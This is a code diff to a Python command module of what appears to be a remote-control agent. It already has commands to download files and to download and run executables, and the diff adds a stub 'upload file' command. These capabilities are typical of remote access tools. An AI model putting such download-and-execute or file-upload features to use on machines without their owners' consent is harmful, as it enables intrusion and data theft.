@@ -16,12 +16,16 @@ class DownloadFileHTTPArgs(CommandArgs):
     saveTo: str
     token: Optional[str] = None
 
+class UploadFileArgs(CommandArgs):
+    file_path: str
+
 class DownloadRunExeArgs(DownloadFileHTTPArgs):
     saveTo: str = TEMP
 
 command_arg_map = {
     Command.DOWNLOAD_FILE_HTTP: DownloadFileHTTPArgs,
     Command.DOWNLOAD_RUN_EXE: DownloadRunExeArgs,
+    Command.UPLOAD_FILE: UploadFileArgs
 }
 
 def open_file(filename: str):
@@ -66,11 +70,21 @@ class Download(ICommandModule):
                 return result
         except Exception as e:
             return CommandResult(result=f"Error: {e}", success=False)
+        
+    @staticmethod
+    def upload_file(args: UploadFileArgs) -> CommandResult:
+        if not os.path.exists(args.file_path):
+            return CommandResult(result="Error: File does not exist.", success=False)
+        try:
+            return CommandResult(result={"path": args.file_path}, success=True)
+        except Exception as e:
+            return CommandResult(result=f"Error: {e}", success=False)
 
     def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
         command_func_map = {
             Command.DOWNLOAD_FILE_HTTP : Download.download_file_http,
-            Command.DOWNLOAD_RUN_EXE : Download.run_any_file
+            Command.DOWNLOAD_RUN_EXE : Download.run_any_file, 
+            Command.UPLOAD_FILE: Download.upload_file
         }
         if command not in command_func_map:
             return CommandResult(result=f"Error: Command not found in module.", success=False)    
